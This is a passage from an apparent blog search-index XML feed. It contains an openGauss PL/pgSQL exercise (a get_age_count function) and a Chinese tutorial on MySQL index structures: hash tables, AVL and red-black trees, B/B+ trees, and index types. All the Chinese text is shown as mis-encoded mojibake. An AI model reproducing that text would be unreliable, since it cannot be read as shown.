¼,å°±å‡ºæ¥äº†.å½“ç„¶åˆ«çš„æ–¹æ³•ä¹Ÿå¯ä»¥åš,ç½‘ä¸Šä¸€æœéƒ½æœ‰,ä½†å‡½æ•°ç”¨èµ·æ¥å°±æ˜¯çˆ½ğŸ¤ª</p><h4 id="é¢˜ç›®12ï¼šåˆ›å»ºå‡½æ•°get-age-count-s-e-ï¼Œè¿”å›å¹´é¾„åœ¨-s-e-èŒƒå›´å†…çš„å‘˜å·¥çš„äººæ•°ã€‚"><a href="#é¢˜ç›®12ï¼šåˆ›å»ºå‡½æ•°get-age-count-s-e-ï¼Œè¿”å›å¹´é¾„åœ¨-s-e-èŒƒå›´å†…çš„å‘˜å·¥çš„äººæ•°ã€‚" class="headerlink" title="é¢˜ç›®12ï¼šåˆ›å»ºå‡½æ•°get_age_count(s,e)ï¼Œè¿”å›å¹´é¾„åœ¨[s,e]èŒƒå›´å†…çš„å‘˜å·¥çš„äººæ•°ã€‚"></a>é¢˜ç›®12ï¼šåˆ›å»ºå‡½æ•°get_age_count(s,e)ï¼Œè¿”å›å¹´é¾„åœ¨[s,e]èŒƒå›´å†…çš„å‘˜å·¥çš„äººæ•°ã€‚</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">CREATE</span> <span class="keyword">OR</span> REPLACE <span class="keyword">FUNCTION</span> get_age_count(s <span class="type">integer</span>, e <span class="type">integer</span>)  </span><br><span class="line"><span class="keyword">RETURNS</span> <span class="type">integer</span> <span class="keyword">AS</span> $total$  </span><br><span class="line"><span class="keyword">declare</span>  </span><br><span class="line">    total <span class="type">integer</span>;  </span><br><span class="line"><span class="keyword">BEGIN</span>  </span><br><span class="line">   <span class="keyword">SELECT</span> <span class="built_in">count</span>(<span class="operator">*</span>) <span class="keyword">INTO</span> total <span class="keyword">FROM</span> employee <span class="keyword">WHERE</span> eage<span class="operator">&gt;=</span>s <span class="keyword">AND</span> eage<span class="operator">&lt;=</span>e;  </span><br><span class="line">   <span class="keyword">RETURN</span> total;  </span><br><span class="line"><span class="keyword">END</span>;  </span><br><span class="line">$total$ <span class="keyword">LANGUAGE</span> plpgsql;</span><br></pre></td></tr></table></figure><p>è¿™é“é¢˜å°±è¦ä»”ç»†çœ‹ä¸‹openGaussçš„æ‰‹å†Œ,æˆ‘ä¸€å¼€å§‹æŒ‰MySQLå‡½æ•°çš„æ ¼å¼å†™å°±é”™äº†,åæ¥ä»”ç»†çœ‹äº†ä¸‹æ‰‹å†Œæ‰å‘ç°openGaussè‡ªå®šä¹‰å‡½æ•°æ˜¯<strong>PostgreSQLæ ¼å¼</strong>çš„,è¿™ç‚¹è¦æ³¨æ„.</p>]]></content>
      
      
      <categories>
          
          <category> xdu </category>
          
      </categories>
      
      
        <tags>
            
            <tag> openGauss </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>MySQLç´¢å¼•ä¸€</title>
      <link href="/2023/12/29/MySQL%E7%B4%A2%E5%BC%95/"/>
      <url>/2023/12/29/MySQL%E7%B4%A2%E5%BC%95/</url>
      
        <content type="html"><![CDATA[<h2 id="MySQLç´¢å¼•ä¸€"><a href="#MySQLç´¢å¼•ä¸€" class="headerlink" title="MySQLç´¢å¼•ä¸€"></a>MySQLç´¢å¼•ä¸€</h2><h3 id="ä»€ä¹ˆæ˜¯ç´¢å¼•"><a href="#ä»€ä¹ˆæ˜¯ç´¢å¼•" class="headerlink" title="ä»€ä¹ˆæ˜¯ç´¢å¼•"></a>ä»€ä¹ˆæ˜¯ç´¢å¼•</h3><p>ç´¢å¼•æ˜¯ä¸€ç§ç”¨äºå¿«é€ŸæŸ¥è¯¢å’Œæ£€ç´¢æ•°æ®çš„æ•°æ®ç»“æ„ï¼Œå…¶æœ¬è´¨å¯ä»¥çœ‹æˆæ˜¯ä¸€ç§æ’åºå¥½çš„<strong>æ•°æ®ç»“æ„</strong>ã€‚</p><p>ç´¢å¼•çš„ä½œç”¨å°±ç›¸å½“äºä¹¦çš„ç›®å½•ã€‚æ‰“ä¸ªæ¯”æ–¹: æˆ‘ä»¬åœ¨æŸ¥å­—å…¸çš„æ—¶å€™ï¼Œå¦‚æœæ²¡æœ‰ç›®å½•ï¼Œé‚£æˆ‘ä»¬å°±åªèƒ½ä¸€é¡µä¸€é¡µçš„å»æ‰¾æˆ‘ä»¬éœ€è¦æŸ¥çš„é‚£ä¸ªå­—ï¼Œé€Ÿåº¦å¾ˆæ…¢ã€‚å¦‚æœæœ‰ç›®å½•äº†ï¼Œæˆ‘ä»¬åªéœ€è¦å…ˆå»ç›®å½•é‡ŒæŸ¥æ‰¾å­—çš„ä½ç½®ï¼Œç„¶åç›´æ¥ç¿»åˆ°é‚£ä¸€é¡µå°±è¡Œäº†ã€‚</p><p>åœ¨ MySQL ä¸­ï¼Œæ— è®ºæ˜¯ Innodb è¿˜æ˜¯ MyIsamï¼Œéƒ½ä½¿ç”¨äº† <strong>B+æ ‘</strong>ä½œä¸ºç´¢å¼•ç»“æ„ã€‚</p><h3 id="ç´¢å¼•çš„ä¼˜ç¼ºç‚¹"><a href="#ç´¢å¼•çš„ä¼˜ç¼ºç‚¹" class="headerlink" title="ç´¢å¼•çš„ä¼˜ç¼ºç‚¹"></a>ç´¢å¼•çš„ä¼˜ç¼ºç‚¹</h3><p>ä¼˜ç‚¹:</p><ul><li>æé«˜æ•°æ®æ£€ç´¢æ•ˆç‡ï¼Œé™ä½æ•°æ®åº“IOæˆæœ¬</li><li>é™ä½æ•°æ®æ’åºæˆæœ¬ï¼Œé™ä½CPUæ¶ˆè€—</li><li>é€šè¿‡åˆ›å»ºå”¯ä¸€æ€§ç´¢å¼•ï¼Œå¯ä»¥ä¿è¯æ•°æ®åº“è¡¨ä¸­æ¯ä¸€è¡Œæ•°æ®çš„å”¯ä¸€æ€§ã€‚</li></ul><p>ç¼ºç‚¹:</p><ul><li>ç´¢å¼•éœ€è¦å ç‰©ç†ç©ºé—´</li><li>ç´¢å¼•éœ€è¦å®šæœŸç»´æŠ¤ï¼Œå¢åˆ æ”¹æ•°æ®æ—¶éœ€è¦ç»´æŠ¤ç´¢å¼•ï¼Œé™ä½æ•°æ®å†™å…¥æ•ˆç‡</li></ul><h3 id="ç´¢å¼•åº•å±‚æ•°æ®ç»“æ„é€‰å‹"><a href="#ç´¢å¼•åº•å±‚æ•°æ®ç»“æ„é€‰å‹" class="headerlink" title="ç´¢å¼•åº•å±‚æ•°æ®ç»“æ„é€‰å‹"></a>ç´¢å¼•åº•å±‚æ•°æ®ç»“æ„é€‰å‹</h3><h4 id="å“ˆå¸Œè¡¨"><a href="#å“ˆå¸Œè¡¨" class="headerlink" title="å“ˆå¸Œè¡¨"></a>å“ˆå¸Œè¡¨</h4><p>å“ˆå¸Œè¡¨æ˜¯ä¸€ç§ä»¥é”®-å€¼(key-value)å­˜å‚¨æ•°æ®çš„ç»“æ„ï¼Œåªè¦è¾“å…¥å¾…æŸ¥æ‰¾å€¼å³ keyï¼Œå°±å¯ä»¥æ‰¾åˆ°å…¶å¯¹åº”çš„å€¼å³ valueã€‚å› æ­¤å“ˆå¸Œè¡¨å¯ä»¥å¿«é€Ÿæ£€ç´¢æ•°æ®ï¼ˆæ¥è¿‘ Oï¼ˆ1ï¼‰ï¼‰ã€‚</p><p>ä¸ºä½•èƒ½å¤Ÿé€šè¿‡ key å¿«é€Ÿå–å‡º value å‘¢ï¼Ÿ åŸå› åœ¨äº <strong>å“ˆå¸Œç®—æ³•</strong>ï¼ˆä¹Ÿå«æ•£åˆ—ç®—æ³•ï¼‰ã€‚é€šè¿‡å“ˆå¸Œç®—æ³•ï¼Œæˆ‘ä»¬å¯ä»¥å¿«é€Ÿæ‰¾åˆ° key å¯¹åº”çš„ indexï¼Œæ‰¾åˆ°äº† index ä¹Ÿå°±æ‰¾åˆ°äº†å¯¹åº”çš„ valueã€‚</p><p><img src="https://pb01.s3.bitiful.net/141.png" alt="avatar"></p><p>ä½†æ˜¯, å“ˆå¸Œè¡¨æœ‰ä¸€ä¸ªå¾ˆå¤§çš„ç¼ºç‚¹: å°±æ˜¯å“ˆå¸Œå†²çªã€‚</p><p>å“ˆå¸Œå†²çª: ä¸¤ä¸ªä¸åŒçš„ key é€šè¿‡å“ˆå¸Œç®—æ³•å¾—åˆ°äº†ç›¸åŒçš„ç»“æœï¼Œè¿™ç§æƒ…å†µæˆ‘ä»¬ç§°ä¸ºå“ˆå¸Œå†²çªã€‚</p><p>é€šå¸¸æƒ…å†µä¸‹ï¼Œæˆ‘ä»¬å¸¸ç”¨çš„è§£å†³åŠæ³•æ˜¯ <code>é“¾åœ°å€æ³•</code>ã€‚é“¾åœ°å€æ³•å°±æ˜¯å°†å“ˆå¸Œå†²çªæ•°æ®å­˜æ”¾åœ¨é“¾è¡¨ä¸­ã€‚å°±æ¯”å¦‚ JDK1.8 ä¹‹å‰ HashMap å°±æ˜¯é€šè¿‡é“¾åœ°å€æ³•æ¥è§£å†³å“ˆå¸Œå†²çªçš„ã€‚ä¸è¿‡ï¼ŒJDK1.8 ä»¥åHashMapä¸ºäº†å‡å°‘é“¾è¡¨è¿‡é•¿çš„æ—¶å€™æœç´¢æ—¶é—´è¿‡é•¿å¼•å…¥äº†çº¢é»‘æ ‘ã€‚</p><p>ä¸ºäº†å‡å°‘ Hash å†²çªçš„å‘ç”Ÿï¼Œä¸€ä¸ªå¥½çš„å“ˆå¸Œå‡½æ•°åº”è¯¥â€œå‡åŒ€åœ°â€å°†æ•°æ®åˆ†å¸ƒåœ¨æ•´ä¸ªå¯èƒ½çš„å“ˆå¸Œå€¼é›†åˆä¸­ã€‚</p><p>MySQL çš„ InnoDB å­˜å‚¨å¼•æ“ä¸ç›´æ¥æ”¯æŒå¸¸è§„çš„å“ˆå¸Œç´¢å¼•ï¼Œä½†æ˜¯ï¼ŒInnoDB å­˜å‚¨å¼•æ“ä¸­å­˜åœ¨ä¸€ç§ç‰¹æ®Šçš„<code>â€œè‡ªé€‚åº”å“ˆå¸Œç´¢å¼•â€</code>ï¼ˆAdaptive Hash Indexï¼‰ï¼Œè‡ªé€‚åº”å“ˆå¸Œç´¢å¼•å¹¶ä¸æ˜¯ä¼ ç»Ÿæ„ä¹‰ä¸Šçš„çº¯å“ˆå¸Œç´¢å¼•ï¼Œè€Œæ˜¯ç»“åˆäº† B+Tree å’Œå“ˆå¸Œç´¢å¼•çš„ç‰¹ç‚¹ï¼Œä»¥ä¾¿æ›´å¥½åœ°é€‚åº”å®é™…åº”ç”¨ä¸­çš„æ•°æ®è®¿é—®æ¨¡å¼å’Œæ€§èƒ½éœ€æ±‚ã€‚è‡ªé€‚åº”å“ˆå¸Œç´¢å¼•çš„æ¯ä¸ªå“ˆå¸Œæ¡¶å®é™…ä¸Šæ˜¯ä¸€ä¸ªå°å‹çš„ B+Tree ç»“æ„ã€‚è¿™ä¸ª B+Tree ç»“æ„å¯ä»¥å­˜å‚¨å¤šä¸ªé”®å€¼å¯¹ï¼Œè€Œä¸ä»…ä»…æ˜¯ä¸€ä¸ªé”®ã€‚è¿™æœ‰åŠ©äºå‡å°‘å“ˆå¸Œå†²çªé“¾çš„é•¿åº¦ï¼Œæé«˜äº†ç´¢å¼•çš„æ•ˆç‡ã€‚</p><p>æ—¢ç„¶å“ˆå¸Œè¡¨è¿™ä¹ˆå¿«ï¼Œä¸ºä»€ä¹ˆ MySQL æ²¡æœ‰ä½¿ç”¨å…¶ä½œä¸ºç´¢å¼•çš„æ•°æ®ç»“æ„å‘¢ï¼Ÿ ä¸»è¦æ˜¯å› ä¸º Hash ç´¢å¼•<strong>ä¸æ”¯æŒé¡ºåºå’ŒèŒƒå›´æŸ¥è¯¢</strong>ã€‚å‡å¦‚æˆ‘ä»¬è¦å¯¹è¡¨ä¸­çš„æ•°æ®è¿›è¡Œæ’åºæˆ–è€…è¿›è¡ŒèŒƒå›´æŸ¥è¯¢ï¼Œé‚£ Hash ç´¢å¼•å¯å°±ä¸è¡Œäº†ã€‚å¹¶ä¸”ï¼Œ<strong>æ¯æ¬¡ IO åªèƒ½å–ä¸€ä¸ª</strong>ã€‚</p><h4 id="äºŒå‰æŸ¥æ‰¾æ ‘"><a href="#äºŒå‰æŸ¥æ‰¾æ ‘" class="headerlink" title="äºŒå‰æŸ¥æ‰¾æ ‘"></a>äºŒå‰æŸ¥æ‰¾æ ‘</h4><p>äºŒå‰æŸ¥æ‰¾æ ‘ï¼ˆBSTï¼‰æ˜¯ä¸€ç§ç‰¹æ®Šçš„äºŒå‰æ ‘ï¼Œå®ƒå…·æœ‰ä»¥ä¸‹å‡ ä¸ªç‰¹ç‚¹ï¼š</p><ul><li>å·¦å­æ ‘æ‰€æœ‰èŠ‚ç‚¹çš„å€¼å‡å°äºæ ¹èŠ‚ç‚¹çš„å€¼ã€‚</li><li>å³å­æ ‘æ‰€æœ‰èŠ‚ç‚¹çš„å€¼å‡å¤§äºæ ¹èŠ‚ç‚¹çš„å€¼ã€‚</li><li>å·¦å­æ ‘å’Œå³å­æ ‘éƒ½æ˜¯äºŒå‰æŸ¥æ‰¾æ ‘ã€‚</li></ul><p>å½“äºŒå‰æŸ¥æ‰¾æ ‘æ˜¯å¹³è¡¡çš„æ—¶å€™ï¼Œä¹Ÿå°±æ˜¯æ ‘çš„æ¯ä¸ªèŠ‚ç‚¹çš„å·¦å³å­æ ‘æ·±åº¦ç›¸å·®ä¸è¶…è¿‡ 1 çš„æ—¶å€™ï¼ŒæŸ¥è¯¢çš„æ—¶é—´å¤æ‚åº¦ä¸º O(log2(N))ï¼Œå…·æœ‰æ¯”è¾ƒé«˜çš„æ•ˆç‡ã€‚ç„¶è€Œï¼Œå½“äºŒå‰æŸ¥æ‰¾æ ‘ä¸å¹³è¡¡æ—¶ï¼Œä¾‹å¦‚åœ¨æœ€åæƒ…å†µä¸‹ï¼ˆæœ‰åºæ’å…¥èŠ‚ç‚¹ï¼‰ï¼Œæ ‘ä¼šé€€åŒ–æˆçº¿æ€§é“¾è¡¨ï¼ˆä¹Ÿè¢«ç§°ä¸ºæ–œæ ‘ï¼‰ï¼Œå¯¼è‡´æŸ¥è¯¢æ•ˆç‡æ€¥å‰§ä¸‹é™ï¼Œæ—¶é—´å¤æ‚é€€åŒ–ä¸º Oï¼ˆNï¼‰ã€‚</p><p>äºŒå‰æŸ¥æ‰¾æ ‘å¯ä»¥æ”¯æŒé¡ºåºå’ŒèŒƒå›´æŸ¥è¯¢ï¼Œä½†æ˜¯ï¼ŒäºŒå‰æŸ¥æ‰¾æ ‘æœ‰ä¸€ä¸ªå¾ˆå¤§çš„ç¼ºç‚¹: å°±æ˜¯å¹³è¡¡æ€§ä¸å¥½ã€‚è¿™å°±å¯¼è‡´å…¶ä¸é€‚åˆä½œä¸º MySQL åº•å±‚ç´¢å¼•çš„æ•°æ®ç»“æ„ã€‚</p><h4 id="å¹³è¡¡äºŒå‰æ ‘-AVLæ ‘"><a href="#å¹³è¡¡äºŒå‰æ ‘-AVLæ ‘" class="headerlink" title="å¹³è¡¡äºŒå‰æ ‘(AVLæ ‘)"></a>å¹³è¡¡äºŒå‰æ ‘(AVLæ ‘)</h4><p>AVL æ ‘çš„ç‰¹ç‚¹æ˜¯ä¿è¯ä»»ä½•èŠ‚ç‚¹çš„å·¦å³å­æ ‘é«˜åº¦ä¹‹å·®ä¸è¶…è¿‡ 1ï¼Œå› æ­¤ä¹Ÿè¢«ç§°ä¸ºé«˜åº¦å¹³è¡¡äºŒå‰æ ‘ï¼Œå®ƒçš„æŸ¥æ‰¾ã€æ’å…¥å’Œåˆ é™¤åœ¨å¹³å‡å’Œæœ€åæƒ…å†µä¸‹çš„æ—¶é—´å¤æ‚åº¦éƒ½æ˜¯ O(logn)ã€‚</p><p>AVL æ ‘é‡‡ç”¨äº†æ—‹è½¬æ“ä½œæ¥ä¿æŒå¹³è¡¡ã€‚ä¸»è¦æœ‰å››ç§æ—‹è½¬æ“ä½œï¼šLL æ—‹è½¬ã€RR æ—‹è½¬ã€LR æ—‹è½¬å’Œ RL æ—‹è½¬ã€‚å…¶ä¸­ LL æ—‹è½¬å’Œ RR æ—‹è½¬åˆ†åˆ«ç”¨äºå¤„ç†å·¦å·¦å’Œå³å³å¤±è¡¡ï¼Œè€Œ LR æ—‹è½¬å’Œ RL æ—‹è½¬åˆ™ç”¨äºå¤„ç†å·¦å³å’Œå³å·¦å¤±è¡¡ã€‚</p><p>ç”±äº AVL æ ‘éœ€è¦é¢‘ç¹åœ°è¿›è¡Œæ—‹è½¬æ“ä½œæ¥ä¿æŒå¹³è¡¡ï¼Œå› æ­¤ä¼šæœ‰è¾ƒå¤§çš„è®¡ç®—å¼€é”€è¿›è€Œé™ä½äº†æŸ¥è¯¢æ€§èƒ½ã€‚å¹¶ä¸”ï¼Œåœ¨ä½¿ç”¨ AVL æ ‘æ—¶ï¼Œæ¯ä¸ªæ ‘èŠ‚ç‚¹ä»…å­˜å‚¨ä¸€ä¸ªæ•°æ®ï¼Œè€Œæ¯æ¬¡è¿›è¡Œç£ç›˜ IO æ—¶åªèƒ½è¯»å–ä¸€ä¸ªèŠ‚ç‚¹çš„æ•°æ®ï¼Œå¦‚æœéœ€è¦æŸ¥è¯¢çš„æ•°æ®åˆ†å¸ƒåœ¨å¤šä¸ªèŠ‚ç‚¹ä¸Šï¼Œé‚£ä¹ˆå°±éœ€è¦è¿›è¡Œå¤šæ¬¡ç£ç›˜ IOã€‚ ç£ç›˜ IO æ˜¯ä¸€é¡¹è€—æ—¶çš„æ“ä½œï¼Œåœ¨è®¾è®¡æ•°æ®åº“ç´¢å¼•æ—¶ï¼Œæˆ‘ä»¬éœ€è¦ä¼˜å…ˆè€ƒè™‘å¦‚ä½•æœ€å¤§é™åº¦åœ°å‡å°‘ç£ç›˜ IO æ“ä½œçš„æ¬¡æ•°ã€‚</p><p>å®é™…åº”ç”¨ä¸­ï¼ŒAVL æ ‘ä½¿ç”¨çš„å¹¶ä¸å¤šã€‚</p><h4 id="çº¢é»‘æ ‘"><a href="#çº¢é»‘æ ‘" class="headerlink" title="çº¢é»‘æ ‘"></a>çº¢é»‘æ ‘</h4><p>çº¢é»‘æ ‘æ˜¯ä¸€ç§è‡ªå¹³è¡¡äºŒå‰æŸ¥æ‰¾æ ‘ï¼Œé€šè¿‡åœ¨æ’å…¥å’Œåˆ é™¤èŠ‚ç‚¹æ—¶è¿›è¡Œé¢œè‰²å˜æ¢å’Œæ—‹è½¬æ“ä½œï¼Œä½¿å¾—æ ‘å§‹ç»ˆä¿æŒå¹³è¡¡çŠ¶æ€ï¼Œå®ƒå…·æœ‰ä»¥ä¸‹ç‰¹ç‚¹ï¼š</p><ol><li>æ¯ä¸ªèŠ‚ç‚¹éçº¢å³é»‘ï¼›</li><li>æ ¹èŠ‚ç‚¹æ€»æ˜¯é»‘è‰²çš„ï¼›</li><li>æ¯ä¸ªå¶å­èŠ‚ç‚¹éƒ½æ˜¯é»‘è‰²çš„ç©ºèŠ‚ç‚¹ï¼ˆNIL èŠ‚ç‚¹ï¼‰ï¼›</li><li>å¦‚æœèŠ‚ç‚¹æ˜¯çº¢è‰²çš„ï¼Œåˆ™å®ƒçš„å­èŠ‚ç‚¹å¿…é¡»æ˜¯é»‘è‰²çš„ï¼ˆåä¹‹ä¸ä¸€å®šï¼‰ï¼›</li><li>ä»æ ¹èŠ‚ç‚¹åˆ°å¶èŠ‚ç‚¹æˆ–ç©ºå­èŠ‚ç‚¹çš„æ¯æ¡è·¯å¾„ï¼Œå¿…é¡»åŒ…å«ç›¸åŒæ•°ç›®çš„é»‘è‰²èŠ‚ç‚¹ï¼ˆå³ç›¸åŒçš„é»‘è‰²é«˜åº¦ï¼‰ã€‚</li></ol><p><img src="https://pb01.s3.bitiful.net/142.png" alt="avatar"></p><p>å’Œ AVL æ ‘ä¸åŒçš„æ˜¯ï¼Œçº¢é»‘æ ‘å¹¶ä¸è¿½æ±‚ä¸¥æ ¼çš„å¹³è¡¡ï¼Œè€Œæ˜¯å¤§è‡´çš„å¹³è¡¡ã€‚æ­£å› å¦‚æ­¤ï¼Œçº¢é»‘æ ‘çš„<strong>æŸ¥è¯¢æ•ˆç‡ç¨æœ‰ä¸‹é™</strong>ï¼Œå› ä¸ºçº¢é»‘æ ‘çš„å¹³è¡¡æ€§ç›¸å¯¹è¾ƒå¼±ï¼Œå¯èƒ½ä¼šå¯¼è‡´æ ‘çš„é«˜åº¦è¾ƒé«˜ï¼Œè¿™å¯èƒ½ä¼šå¯¼è‡´ä¸€äº›æ•°æ®éœ€è¦è¿›è¡Œå¤šæ¬¡ç£ç›˜ IO æ“ä½œæ‰èƒ½æŸ¥è¯¢åˆ°ï¼Œè¿™ä¹Ÿæ˜¯ MySQL æ²¡æœ‰é€‰æ‹©çº¢é»‘æ ‘çš„ä¸»è¦åŸå› ã€‚ä¹Ÿæ­£å› å¦‚æ­¤ï¼Œçº¢é»‘æ ‘çš„<strong>æ’å…¥å’Œåˆ é™¤æ“ä½œæ•ˆç‡å¤§å¤§æé«˜äº†</strong>ï¼Œå› ä¸ºçº¢é»‘æ ‘åœ¨æ’å…¥å’Œåˆ é™¤èŠ‚ç‚¹æ—¶åªéœ€è¿›è¡Œ O(1) æ¬¡æ•°çš„æ—‹è½¬å’Œå˜è‰²æ“ä½œï¼Œå³å¯ä¿æŒåŸºæœ¬å¹³è¡¡çŠ¶æ€ï¼Œè€Œä¸éœ€è¦åƒ AVL æ ‘ä¸€æ ·è¿›è¡Œ O(logn) æ¬¡æ•°çš„æ—‹è½¬æ“ä½œã€‚</p><p>çº¢é»‘æ ‘çš„åº”ç”¨è¿˜æ˜¯æ¯”è¾ƒå¹¿æ³›çš„ï¼ŒTreeMapã€TreeSet ä»¥åŠ JDK1.8 çš„ HashMap åº•å±‚éƒ½ç”¨åˆ°äº†çº¢é»‘æ ‘ã€‚å¯¹äºæ•°æ®åœ¨å†…å­˜ä¸­çš„è¿™ç§æƒ…å†µæ¥è¯´ï¼Œçº¢é»‘æ ‘çš„è¡¨ç°æ˜¯éå¸¸ä¼˜å¼‚çš„ã€‚</p><h4 id="B-æ ‘-amp-B-æ ‘"><a href="#B-æ ‘-amp-B-æ ‘" class="headerlink" title="B æ ‘&amp; B+æ ‘"></a>B æ ‘&amp; B+æ ‘</h4><p>B æ ‘ä¹Ÿç§° B-æ ‘,å…¨ç§°ä¸º å¤šè·¯å¹³è¡¡æŸ¥æ‰¾æ ‘ ï¼ŒB+ æ ‘æ˜¯ B æ ‘çš„ä¸€ç§å˜ä½“ã€‚ç›®å‰å¤§éƒ¨åˆ†æ•°æ®åº“ç³»ç»ŸåŠæ–‡ä»¶ç³»ç»Ÿéƒ½é‡‡ç”¨ B-Tree æˆ–å…¶å˜ç§ B+Tree ä½œä¸ºç´¢å¼•ç»“æ„ã€‚</p><p><strong>B æ ‘&amp; B+æ ‘ä¸¤è€…æœ‰ä½•å¼‚åŒå‘¢ï¼Ÿ</strong></p><ul><li>B æ ‘çš„æ‰€æœ‰èŠ‚ç‚¹æ—¢å­˜æ”¾é”®(key) ä¹Ÿå­˜æ”¾æ•°æ®(data)ï¼Œè€Œ B+æ ‘åªæœ‰å¶å­èŠ‚ç‚¹å­˜æ”¾ key å’Œ dataï¼Œå…¶ä»–å†…èŠ‚ç‚¹åªå­˜æ”¾ keyã€‚</li><li>B æ ‘çš„å¶å­èŠ‚ç‚¹éƒ½æ˜¯ç‹¬ç«‹çš„;B+æ ‘çš„å¶å­èŠ‚ç‚¹æœ‰ä¸€æ¡å¼•ç”¨é“¾æŒ‡å‘ä¸å®ƒç›¸é‚»çš„å¶å­èŠ‚ç‚¹ã€‚</li><li>B æ ‘çš„æ£€ç´¢çš„è¿‡ç¨‹ç›¸å½“äºå¯¹èŒƒå›´å†…çš„æ¯ä¸ªèŠ‚ç‚¹çš„å…³é”®å­—åšäºŒåˆ†æŸ¥æ‰¾ï¼Œå¯èƒ½è¿˜æ²¡æœ‰åˆ°è¾¾å¶å­èŠ‚ç‚¹ï¼Œæ£€ç´¢å°±ç»“æŸäº†ã€‚è€Œ B+æ ‘çš„æ£€ç´¢æ•ˆç‡å°±å¾ˆç¨³å®šäº†ï¼Œä»»ä½•æŸ¥æ‰¾éƒ½æ˜¯ä»æ ¹èŠ‚ç‚¹åˆ°å¶å­èŠ‚ç‚¹çš„è¿‡ç¨‹ï¼Œå¶å­èŠ‚ç‚¹çš„é¡ºåºæ£€ç´¢å¾ˆæ˜æ˜¾ã€‚</li><li>åœ¨ B æ ‘ä¸­è¿›è¡ŒèŒƒå›´æŸ¥è¯¢æ—¶ï¼Œé¦–å…ˆæ‰¾åˆ°è¦æŸ¥æ‰¾çš„ä¸‹é™ï¼Œç„¶åå¯¹ B æ ‘è¿›è¡Œä¸­åºéå†ï¼Œç›´åˆ°æ‰¾åˆ°æŸ¥æ‰¾çš„ä¸Šé™ï¼›è€Œ B+æ ‘çš„èŒƒå›´æŸ¥è¯¢ï¼Œåªéœ€è¦å¯¹é“¾è¡¨è¿›è¡Œéå†å³å¯ã€‚</li></ul><p>ç»¼ä¸Šï¼ŒB+æ ‘ä¸ B æ ‘ç›¸æ¯”ï¼Œå…·å¤‡æ›´å°‘çš„ IO æ¬¡æ•°ã€æ›´ç¨³å®šçš„æŸ¥è¯¢æ•ˆç‡å’Œæ›´é€‚äºèŒƒå›´æŸ¥è¯¢è¿™äº›ä¼˜åŠ¿ã€‚</p><h3 id="ç´¢å¼•ç±»å‹æ€»ç»“"><a href="#ç´¢å¼•ç±»å‹æ€»ç»“" class="headerlink" title="ç´¢å¼•ç±»å‹æ€»ç»“"></a>ç´¢å¼•ç±»å‹æ€»ç»“</h3><p><strong>åˆ†ç±»</strong></p><ul><li>ä¸»é”®ç´¢å¼•ï¼šåŠ é€ŸæŸ¥è¯¢ + åˆ—å€¼å”¯ä¸€ï¼ˆä¸å¯ä»¥æœ‰ NULLï¼‰+ è¡¨ä¸­åªæœ‰ä¸€ä¸ªã€‚</li><li>æ™®é€šç´¢å¼•ï¼šä»…åŠ é€ŸæŸ¥è¯¢ã€‚</li><li>å”¯ä¸€ç´¢å¼•ï¼šåŠ é€ŸæŸ¥è¯¢ + åˆ—å€¼å”¯ä¸€ï¼ˆå¯ä»¥æœ‰ NULLï¼‰ã€‚</li><li>è¦†ç›–ç´¢å¼•ï¼šä¸€ä¸ªç´¢å¼•åŒ…å«ï¼ˆæˆ–è€…è¯´è¦†ç›–ï¼‰æ‰€æœ‰éœ€è¦æŸ¥è¯¢çš„å­—æ®µçš„å€¼ã€‚</li><li>è”åˆç´¢å¼•ï¼šå¤šåˆ—å€¼ç»„æˆä¸€ä¸ªç´¢å¼•ï¼Œä¸“é—¨ç”¨äºç»„åˆæœç´¢ï¼Œå…¶æ•ˆç‡å¤§äºç´¢å¼•åˆå¹¶ã€‚</li><li>å…¨æ–‡ç´¢å¼•ï¼šå¯¹æ–‡æœ¬çš„å†…å®¹è¿›è¡Œåˆ†è¯ï¼Œè¿›è¡Œæœç´¢ã€‚ç›®å‰åªæœ‰ <code>CHAR</code>ã€<code>VARCHAR</code> ï¼Œ<code>TEXT</code> åˆ—ä¸Šå¯ä»¥åˆ›å»ºå…¨æ–‡ç´¢å¼•ã€‚ä¸€èˆ¬ä¸ä¼šä½¿ç”¨ï¼Œæ•ˆç‡è¾ƒä½ï¼Œé€šå¸¸ä½¿ç”¨æœç´¢å¼•æ“å¦‚ <code>ElasticSearch</code> ä»£æ›¿ã€‚</li></ul><p>MySQL 8.x ä¸­å®ç°çš„ç´¢å¼•æ–°ç‰¹æ€§ï¼š</p><ul><li>éšè—ç´¢å¼•ï¼šä¹Ÿç§°ä¸ºä¸å¯è§ç´¢å¼•ï¼Œä¸ä¼šè¢«ä¼˜åŒ–å™¨ä½¿ç”¨ï¼Œä½†æ˜¯ä»ç„¶éœ€è¦ç»´æŠ¤ï¼Œé€šå¸¸ä¼šè½¯åˆ é™¤å’Œç°åº¦å‘å¸ƒçš„åœºæ™¯ä¸­ä½¿ç”¨ã€‚ä¸»é”®ä¸èƒ½è®¾ç½®ä¸ºéšè—ï¼ˆåŒ…æ‹¬æ˜¾å¼è®¾ç½®æˆ–éšå¼è®¾ç½®ï¼‰ã€‚</li><li>é™åºç´¢å¼•ï¼šä¹‹å‰çš„ç‰ˆæœ¬å°±æ”¯æŒé€šè¿‡ desc æ¥æŒ‡å®šç´¢å¼•ä¸ºé™åºï¼Œä½†å®é™…ä¸Šåˆ›å»ºçš„ä»ç„¶æ˜¯å¸¸è§„çš„å‡åºç´¢å¼•ã€‚ç›´åˆ° MySQL 8.x ç‰ˆæœ¬æ‰å¼€å§‹çœŸæ­£æ”¯æŒé™åºç´¢å¼•ã€‚å¦å¤–ï¼Œåœ¨ MySQL 8.x ç‰ˆæœ¬ä¸­ï¼Œä¸å†å¯¹ GROUP BY è¯­å¥è¿›è¡Œéšå¼æ’åºã€‚</li><li>å‡½æ•°ç´¢å¼•ï¼šä» MySQL 8.0.13 ç‰ˆæœ¬å¼€å§‹æ”¯æŒåœ¨ç´¢å¼•ä¸­ä½¿ç”¨å‡½æ•°æˆ–è€…è¡¨è¾¾å¼çš„å€¼ï¼Œä¹Ÿå°±æ˜¯åœ¨ç´¢å¼•ä¸­å¯ä»¥åŒ…å«å‡½æ•°æˆ–è€…è¡¨è¾¾å¼ã€‚</li></ul><h4 id="ä¸»é”®ç´¢å¼•"><a href="#ä¸»é”®ç´¢å¼•" class="headerlink" 